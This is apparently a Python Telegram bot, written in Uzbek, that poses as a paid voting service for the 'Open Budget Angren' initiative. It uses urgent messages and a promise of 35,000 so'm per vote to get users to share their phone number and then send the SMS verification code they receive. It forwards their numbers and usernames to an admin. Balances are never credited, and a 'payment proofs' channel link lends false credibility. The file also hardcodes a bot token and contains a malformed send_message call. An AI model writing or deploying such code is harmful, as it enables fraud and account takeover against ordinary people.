import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiohttp import web

API_TOKEN = "8996873868:AAHtwvuXhsAkmW0n-B376wH25pgfQeCurp0"
ADMIN_ID = 123456789  # SHU YERGA O'ZINGIZNING TELEGRAM ID'INGIZNI YOZING

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Foydalanuvchilar balansini vaqtincha saqlash
user_balances = {}

class BotStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otziv = State()

# Asosiy menyu (Skrinshotdagidek, referalsiz)
def main_menu():
    builder = ReplyKeyboardBuilder()
    builder.button(text="📦 Ovoz berish")
    builder.button(text="💰 Balans")
    builder.button(text="📥 Pulni yechib olish")
    builder.button(text="🎉 Aksiyalar")
    builder.button(text="🐝 To'lovlar isboti")
    builder.button(text="💬 Admin bilan aloqa")
    builder.adjust(1, 2, 2, 1)
    return builder.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    await message.answer(
        "⚡️ **Open Budget Angren botiga xush kelibsiz!**\n\n"
        "✈️ **NARX YANA OSHIRILDI: 35.000 SO'M**\n"
        "💸 FOYDALANIB QOLINGLAR\n"
        "🔥 2-KUN VAQTINGIZ QOLDI 🔥\n\n"
        "Ovoz berish uchun quyidagi menyudan foydalaning:",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# 📦 Ovoz berish
@dp.message(F.text == "📦 Ovoz berish")
async def ovoz_berish(message: types.Message, state: FSMContext):
    builder = ReplyKeyboardBuilder()
    builder.button(text="📱 Raqamni yuborish", request_contact=True)
    builder.adjust(1)
    
    await message.answer(
        "Ovoz berish va 35.000 so'm mukofotni olish uchun pastdagi **'📱 Raqamni yuborish'** tugmasini bosing va kelgan SMS kodni yuboring:",
        reply_markup=builder.as_markup(resize_keyboard=True)
    )
    await state.set_state(BotStates.waiting_for_phone)

@dp.message(F.contact, BotStates.waiting_for_phone)
async def get_contact(message: types.Message, state: FSMContext):
    user = message.from_user
    phone = message.contact.phone_number
    
    # Adminga raqamni yuborish
    await bot.send_message(
        ADMIN_ID,'7529575046'
        f"📥 **Yangi ovoz berish uchun raqam:**\nUser: @{user.username} ({user.full_name})\nTel: `{phone}`",
        parse_mode="Markdown"
    )
    
    await message.answer("✅ Raqamingiz qabul qilindi! Tezzora SMS kod yuboriladi, kodni shu yerga yozib yuboring.", reply_markup=main_menu())
    await state.clear()

# 💰 Balans
@dp.message(F.text == "💰 Balans")
async def check_balance(message: types.Message):
    user_id = message.from_user.id
    balance = user_balances.get(user_id, 0)
    await message.answer(
        f"💳 **Sizning balansingiz:** {balance:,} so'm\n\n"
        f"Ovoz berish orqali balansingizni to'ldirishingiz mumkin!",
        parse_mode="Markdown"
    )

# 📥 Pulni yechib olish
@dp.message(F.text == "📥 Pulni yechib olish")
async def withdraw_money(message: types.Message):
    user_id = message.from_user.id
    balance = user_balances.get(user_id, 0)
    
    if balance < 35000:
        await message.answer(
            f"❌ **Minimal pul yechish summasi:** 35.000 so'm\n"
            f"Sizning balansingiz: {balance:,} so'm.\n\n"
            f"Pulni yechish uchun kamida 1 ta ovoz berishingiz kerak."
        )
    else:
        await message.answer("Karta raqamingizni va ism-familiyangizni kiriting:")

# 🎉 Aksiyalar
@dp.message(F.text == "🎉 Aksiyalar")
async def show_promotions(message: types.Message):
    await message.answer(
        "🎁 **BONUSLAR VA AKSIYALAR O'Z JOYIDA!**\n\n"
        "🏆 **Kunlik TOP 10:** Eng ko'p ovoz yig'ganlarga qo'shimcha mukofot!\n"
        "⭐️ **5 ta ovozdan bonus:** Har 5 ta ovoz uchun ekstra bonus!\n"
        "⚡️ **Har bir ovoz uchun:** 35.000 so'm to'g'ridan-to'g'ri kartangizga!\n\n"
        "⏰ **FAQT BUGUN 23:59 GACHA!** Imkoniyatni boy bermang!",
        parse_mode="Markdown"
    )

# 🐝 To'lovlar isboti
@dp.message(F.text == "🐝 To'lovlar isboti")
async def payment_proofs(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="📢 To'lovlar kanaliga o'tish", url="https://t.me/merik_bujet")
    await message.answer(
        "✅ **Barcha to'lovlar isboti va cheklar rasmiy kanalimizda e'lon qilib boriladi:**",
        reply_markup=builder.as_markup()
    )

# 💬 Admin bilan aloqa
@dp.message(F.text == "💬 Admin bilan aloqa")
async def contact_admin(message: types.Message, state: FSMContext):
    await message.answer("Savolingiz yoki murojaatingizni yozib yuboring:")
    await state.set_state(BotStates.waiting_for_otziv)

@dp.message(BotStates.waiting_for_otziv)
async def receive_otziv(message: types.Message, state: FSMContext):
    user = message.from_user
    await message.answer("Murojaatingiz adminga yetkazildi!", reply_markup=main_menu())
    await state.clear()
    
    await bot.send_message(
        ADMIN_ID,
        f"💬 **Murojaat:**\nKimdan: @{user.username} ({user.full_name})\nMatn: {message.text}"
    )

# Render port soxta serveri
async def handle(request):
    return web.Response(text="Bot Live!")

async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
